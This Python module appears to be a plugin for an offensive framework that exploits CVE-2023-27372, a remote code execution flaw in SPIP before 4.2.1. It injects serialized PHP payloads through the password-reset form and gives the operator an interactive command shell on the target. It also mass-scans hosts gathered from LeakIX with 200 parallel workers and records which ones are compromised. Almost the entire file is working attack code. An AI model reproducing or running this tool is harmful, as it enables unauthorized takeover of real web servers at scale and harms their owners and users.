import os
import re
import bs4
import base64
import requests

from modules.io import *
from core.modular import Module
from urllib.parse import urlparse
from alive_progress import alive_bar
from leakpy.scraper import LeakixScraper
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed


class Exploit(Module):
    """
    SPIP Remote Code Execution Vulnerability

    Description:
    SPIP versions before 4.2.1 have been found to contain a remote code execution vulnerability in the public area. This vulnerability is due to mishandling of serialization of form values. An attacker can exploit this vulnerability to execute arbitrary code on the affected system.

    Impact:
    An attacker can exploit this vulnerability by submitting specially crafted form values to the SPIP application. Successful exploitation of the vulnerability allows the attacker to execute arbitrary code with the privileges of the web server or the user running the SPIP application. This can lead to a complete compromise of the affected system, unauthorized access to sensitive information, or disruption of services.

    Affected Versions:
    - SPIP versions before 4.2.1

    Fixed Versions:
    - SPIP version 3.2.18
    - SPIP version 4.0.10
    - SPIP version 4.1.8
    - SPIP version 4.2.1
    """
    def __init__(self):
        self.name = "CVE-2023-27372"
        self.description = "RCE on SPIP applications before version 4.2.1"
        self.author = "Chocapikk"
        self.creation_date = "17-11-2023"

        self.session = PromptSession(InMemoryHistory())
        self.output_file = None
        self.list_urls = None

    def execute(self):
        requests.packages.urllib3.disable_warnings()
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += (
                ":HIGH:!DH:!aNULL"
            )
        except AttributeError:
            pass

        self.configure_options()

        if self.output_path:
            self.output_file = open(self.output_path, "w")

        urls = []

        if self.use_leakpy:
            urls = self.fetch_from_leakix(pages=self.leakpy_pages)

        if self.list_urls:
            with open(self.list_urls, "r") as f:
                urls.extend([self.fix_url(line.strip()) for line in f])

        if urls:
            with alive_bar(
                len(urls),
                bar="notes",
                spinner="wait",
                title="Scanning...",
                enrich_print=False,
            ) as bar:
                with ThreadPoolExecutor(max_workers=200) as executor:
                    futures = {
                        executor.submit(self.check_vulnerability_wrapper, url)
                        for url in urls
                    }
                    for future in as_completed(futures):
                        bar()

        elif self.url:
            if self.check_vulnerability(self.url):
                print_success(f"The URL {self.url} is vulnerable")
                print_info(f"Shell is ready, please type your commands UwU")
                while True:
                    try:
                        cmd = self.session.prompt(HTML("<ansired><b># </b></ansired>"))
                        if cmd.lower() == "exit":
                            break
                        elif cmd.lower() == "clear":
                            if os.name == "posix":
                                os.system("clear")
                            elif os.name == "nt":
                                os.system("cls")
                            continue

                        command_str = (
                            "<?php system('echo [' . 'S' . '] ; ' . '%s' . '; echo [' . 'E' . '] ;');?>"
                            % cmd
                        )
                        payload = 's:%s:"%s";' % (len(command_str), command_str)
                        csrf = self.get_anticsrf(self.url)
                        result = self.send_payload(
                            url=self.url, csrf=csrf, payload=payload
                        )
                        output = self.parse_output(result)
                        print_success("\n" + output)

                    except KeyboardInterrupt:
                        print_info(f"Exiting...")
                        break
        else:
            print_error("Not vulnerable")

        if self.output_file:
            self.output_file.close()

    def configure_options(self):
        mode = input_data(self.name, "Choose the mode (url/mass)")

        if mode == "url":
            self.url = input_data(self.name, "Enter the URL")
            self.list_urls = None
            self.use_leakpy = False
        elif mode == "mass":
            self.url = None
            self.use_leakpy = input_data(self.name, "Use LeakPy? (y/n)") == "y"
            if self.use_leakpy:
                self.leakpy_pages = int(input_data(self.name, "Number of LeakIX pages"))
            else:
                self.list_urls = input_data(self.name, "File containing the URLs")
        else:
            print_error("Invalid mode")

        self.output_path = input_data(self.name, "Output file (leave blank for none)")
        self.verbose = input_data(self.name, "Verbose mode? (y/n)") == "y"

    def fetch_from_leakix(self, fields="protocol, host", pages=2):
        LEAKIX_API_KEY = (
            input_data(
                self.name,
                "Enter your LeakIX API key (leave blank if already configured)",
            )
            or None
        )

        scraper = LeakixScraper(api_key=LEAKIX_API_KEY, verbose=True)

        results = scraper.execute(
            scope="service",
            query='+"SPIP"',
            fields=fields,
            pages=pages,
            use_bulk=False,
        )

        url_dict = {}
        for result in results:
            protocol = result.get("protocol")
            host = result.get("host")
            url = f"{protocol}://{host}"
            url_dict[host] = url.replace("www.", "")

        return list(url_dict.values())

    def get_anticsrf(self, url):
        try:
            r = requests.get(f"{url}/spip.php?page=spip_pass", timeout=5, verify=False)
            soup = bs4.BeautifulSoup(r.text, "html.parser")
            csrf_input = soup.find("input", {"name": "formulaire_action_args"})
            if csrf_input:
                csrf_value = csrf_input["value"]
                if self.verbose:
                    print_status(f"Anti-CSRF token found : {csrf_value}")
                return csrf_value
            else:
                if self.verbose:
                    print_error("Unable to find Anti-CSRF token")
                return -1
        except requests.exceptions.RequestException as e:
            print_error(f"Error making request: {e}") if self.verbose else None
            return -1

    def send_payload(self, url, csrf, payload):
        try:
            data = {
                "page": "spip_pass",
                "formulaire_action": "oubli",
                "formulaire_action_args": csrf,
                "oubli": payload,
            }
            r = requests.post(
                f"{url}/spip.php?page=spip_pass", data=data, timeout=3, verify=False
            )
            if self.verbose:
                print_info(f"Execute this payload : {payload}")
            return r.text
        except requests.exceptions.RequestException as e:
            print_error(f"Error sending payload: {e}")
            return ""

    def parse_output(self, text):
        pattern = re.compile(r"\[S\](.*?)\[E\]", re.DOTALL)
        matches = pattern.findall(text)
        return "\n".join(matches)

    def fix_url(self, url):
        parsed_url = urlparse(url)
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"

    def check_vulnerability_wrapper(self, url):
        vulnerable = False
        for _ in range(2):
            output = self.check_vulnerability(url)
            if output:
                vulnerable = True
                if "whoami" in output:
                    print_info(
                        f"The URL {url} is vulnerable but RCE failed (try other payloads)"
                    )
                else:
                    print_success(
                        f"The URL {url} is vulnerable with 'whoami' result: {output.strip()}"
                    )

                self._write(f"URL: {url} ==> {output.strip()}")
                break

        if not vulnerable and self.verbose:
            print_error(f"The URL {url} is not vulnerable")

    def _write(self, text):
        if self.output_file:
            self.output_file.write(text + "\n")

    def check_vulnerability(self, url):
        csrf = self.get_anticsrf(url)
        if csrf == -1:
            return False

        cmd = "echo [S] ; whoami ; echo [E]"
        cmd_encoded = base64.b64encode(cmd.encode()).decode()
        command_str = "<?php passthru(base64_decode('%s'));?>" % cmd_encoded
        payload = 's:%s:"%s";' % (len(command_str), command_str)
        result = self.send_payload(url=url, csrf=csrf, payload=payload)
        output = self.parse_output(result)

        if output:
            return output
        else:
            return False
